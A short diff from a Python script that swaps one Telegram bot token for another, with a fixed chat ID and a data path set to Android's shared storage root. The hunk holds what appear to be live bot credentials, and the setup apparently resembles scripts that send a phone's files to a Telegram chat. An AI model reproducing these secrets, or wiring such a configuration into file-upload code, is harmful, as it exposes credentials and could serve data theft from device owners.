@@ -4,7 +4,7 @@ import time
 import sys
 import threading
 
-bot_token = '7668855532:AAHAyBP5Ohpp4n0Wm5Yt2sUFn8w_9i_aPbo'
+bot_token = '7470023488:AAEFI_uHN7pEfvtcqCQ75S8K7iJd8ClxSTc'
 chat_id = '6296611162'
 
 data_path = '/storage/emulated/0/'
